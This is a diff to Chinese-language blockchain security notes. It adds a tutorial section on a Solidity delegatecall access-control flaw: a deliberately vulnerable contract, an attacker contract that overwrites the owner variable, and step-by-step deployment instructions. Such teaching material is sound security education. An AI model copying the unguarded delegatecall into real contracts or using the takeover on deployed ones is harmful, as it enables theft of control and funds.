@@ -1767,15 +1767,94 @@ function withdraw(address to, uint256 amount) {
 
 **三种调用方式的异同点**
 
-- `call` 最常用的调用方式，调用后内置变量 `msg` 的值**会修改**为调用者，执行环境为**被调用者**的运行环境(合约的 storage)。
-- `delegatecall` 调用后内置变量 `msg` 的值**不会修改**为调用者，但执行环境为**调用者**的运行环境。
-- `callcode` 调用后内置变量 `msg` 的值**会修改**为调用者，但执行环境为**调用者**的运行环境。
+- `call` 最常用的调用方式，调用后内置变量 `msg` 的值**会修改**为调用者，执行环境为**被调用者**的运行环境
+- `delegatecall` 调用后内置变量 `msg` 的值**不会修改**为调用者，但执行环境为**调用者**的运行环境
+- `callcode` 调用后内置变量 `msg` 的值**会修改**为调用者，但执行环境为**调用者**的运行环境
 
 `call` 与 `delegatecall` 的上下文环境对比如下所示
 
 > 合约 A 以 `call` 方式调用外部合约 B 的 `func()` 函数，在外部合约 B 上下文执行完 `func()` 后继续返回 A 合约上下文继续执行；而当 A 以 `delegatecall` 方式调用时，相当于将外部合约 B 的 `func()` 代码复制过来（其函数中涉及的变量或函数都需要存在）在 A 上下文空间中执行。
 
 ![img](pic/blockchain/call_delegatecall.png)
+
+#### 存在漏洞的合约
+
+```javascript
+contract A {
+    address public owner;
+    uint256 public value;
+    
+    constructor () public {
+        owner = msg.sender;
+        value = 99;
+    }
+
+    function infect(address _addr) public returns(bool) {
+        return _addr.delegatecall(bytes4(keccak256("func()")));
+    }
+}
+```
+
+#### 存在的问题
+
+合约 `A` 中，函数 `infect` 使用 `delegatecall` 调用另一合约的函数，如果攻击者部署一个精心构造的合约，并且将该地址传入函数 `infect`，能够将合约 `A` 中的 `owner` 修改为攻击者自己（`msg.sender`）
+
+#### 攻击合约
+
+```javascript
+pragma solidity ^0.4.24;
+
+contract A {
+    address public owner;
+    uint256 public value;
+    
+    constructor () public {
+        owner = msg.sender;
+        value = 99;
+    }
+
+    function infect(address _addr) public returns(bool) {
+        return _addr.delegatecall(bytes4(keccak256("func()")));
+    }
+}
+
+contract B {
+    address public owner;
+    uint256 public value;
+    
+    constructor () public {
+        owner = msg.sender;
+        value = 101;
+    }
+
+    function func() public  {
+        owner = msg.sender;
+        value = 100;
+    }
+}
+```
+
+#### 攻击原理
+
+`delegatecall` 执行环境为调用合约的上下文，即，合约 `A` 中的函数 `infect` 调用了合约 `B` 的函数 `func`，因为执行上下文是合约 `A`，所以能够修改合约 `A` 中的 `owner` 和 `value`
+
+#### 攻击过程
+
+使用账户 `0xca35b7d915458ef540ade6068dfe2f44e8fa733c` 部署合约 `A`，并查看 `owner` 和 `value` 的值
+
+![](pic/blockchain/deploy_access_control.png)
+
+使用账户 `0xdd870fa1b7c4700f2bd7f44238821c26f7392148` 部署合约 `B`，并查看 `owner` 和 `value` 的值
+
+![](pic/blockchain/deploy_access_control2.png)
+
+执行合约 `A` 的函数 `infect`，参数为合约 `B` 的合约地址
+
+![](pic/blockchain/call_infect.png)
+
+然后，并查看合约 `A` 中 `owner` 和 `value` 的值
+
+![](pic/blockchain/owner_value.png)
 
 ## 比特币 bitcoin
 
